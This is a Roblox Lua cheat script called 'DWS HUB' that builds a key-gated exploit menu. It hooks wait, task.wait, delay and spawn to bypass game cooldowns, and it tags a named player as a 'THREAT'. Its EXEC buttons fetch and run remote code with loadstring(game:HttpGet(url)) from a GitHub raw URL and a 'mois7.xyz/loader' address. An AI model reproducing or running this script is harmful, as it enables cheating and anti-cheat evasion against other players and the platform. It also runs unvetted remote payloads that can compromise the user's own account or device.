-- DWS HUB | PREMIUM EDITION
local LP=game:GetService("Players").LocalPlayer;local RS=game:GetService("RunService");local TS=game:GetService("TweenService");local UI=Instance.new("ScreenGui",game:GetService("CoreGui"));UI.Name="DWSHub"

-- Factory: UI Elements
local function create(c,p,s,b,t) local o=Instance.new(c,p);o.Size=s;o.BackgroundColor3=b;if t then o.Text=t;o.TextColor3=Color3.new(1,1,1);o.Font=Enum.Font.Gotham;o.TextSize=14 end;return o end

-- Core UI Setup
local main=create("Frame",UI,UDim2.new(0,400,0,300),Color3.fromRGB(20,20,20));main.Visible=false;Instance.new("UICorner",main)
local title=create("TextLabel",main,UDim2.new(1,0,0,40),Color3.new(0,0,0,0),"DWS HUB - v3.0");title.TextColor3=Color3.new(0,0.5,1)

-- Threat Identifier Logic
local isThreat=(LP.Name=="city800")
local av=create("ImageLabel",main,UDim2.new(0,50,0,50),Color3.new(0,0,0,0));av.Image=game:GetService("Players"):GetUserThumbnailAsync(LP.UserId,Enum.ThumbnailType.HeadShot,Enum.ThumbnailSize.Size420x420);av.Position=UDim2.new(0,10,0,50);Instance.new("UICorner",av).CornerRadius=UDim.new(1,0)
if isThreat then local th=create("TextLabel",av,UDim2.new(1,0,0,20),Color3.fromRGB(255,0,0),"THREAT");th.Position=UDim2.new(0,0,1,0);th.TextColor3=Color3.new(1,1,1) end

-- Cooldown Engines
local function initVegaX()
    local instant=function() return RS.Heartbeat:Wait() end
    hookfunction(wait,instant);hookfunction(task.wait,instant)
    hookfunction(delay,function(_,f) task.spawn(f) end);hookfunction(spawn,function(f) task.spawn(f) end)
end

-- Key System
local kf=create("Frame",UI,UDim2.new(0,300,0,150),Color3.fromRGB(20,20,20));local kb=create("TextBox",kf,UDim2.new(0,250,0,40),Color3.fromRGB(40,40,40),"");kb.PlaceholderText="Enter Key...";kb.Position=UDim2.new(0.5,-125,0,50)
create("TextButton",kf,UDim2.new(0,100,0,40),Color3.fromRGB(0,100,255),"SUBMIT").MouseButton1Click:Connect(function()
    if kb.Text=="pvpOGS" then 
        kf.Visible=false;local b=create("Frame",UI,UDim2.new(1,0,1,0),Color3.new(0,0,0));task.wait(0.5)
        local t=create("TextLabel",b,UDim2.new(1,0,0,50),Color3.new(0,0,0,0),"");t.TextColor3=Color3.new(0,1,0);
        for i=1,#"hi...clan member your access has-been accepted" do t.Text=string.sub("hi...clan member your access has-been accepted",1,i);task.wait(0.05) end
        task.wait(1);b:Destroy();main.Visible=true
    end
end)

-- Admin Sections
local function addAdmin(name, url, color)
    local p=create("Frame",main,UDim2.new(0,350,0,50),color);create("TextLabel",p,UDim2.new(0,100,1,0),Color3.new(0,0,0,0),name)
    create("TextButton",p,UDim2.new(0,80,0,30),Color3.new(0,0,0),"EXEC").MouseButton1Click:Connect(function() loadstring(game:HttpGet(url))() end)
    create("TextButton",p,UDim2.new(0,80,0,30),Color3.new(0,0,0),"COPY").MouseButton1Click:Connect(function() setclipboard(url) end)
end
addAdmin("Nameless Admin", "https://raw.githubusercontent.com/FilteringEnabled/NamelessAdmin/main/Source", Color3.fromRGB(0,255,0))
addAdmin("M7 Admin", "https://mois7.xyz/loader", Color3.fromRGB(128,0,128))

-- Skull Minimizer
local sk=create("TextButton",UI,UDim2.new(0,50,0,50),Color3.new(0,0,0,0),"☠️");sk.Visible=false;sk.MouseButton1Click:Connect(function() main.Visible=true;sk.Visible=false end)
create("TextButton",main,UDim2.new(0,30,0,30),Color3.fromRGB(255,0,0),"X").MouseButton1Click:Connect(function() main.Visible=false;sk.Visible=true end)

print("⚡ DWS HUB V3.0 LOADED")
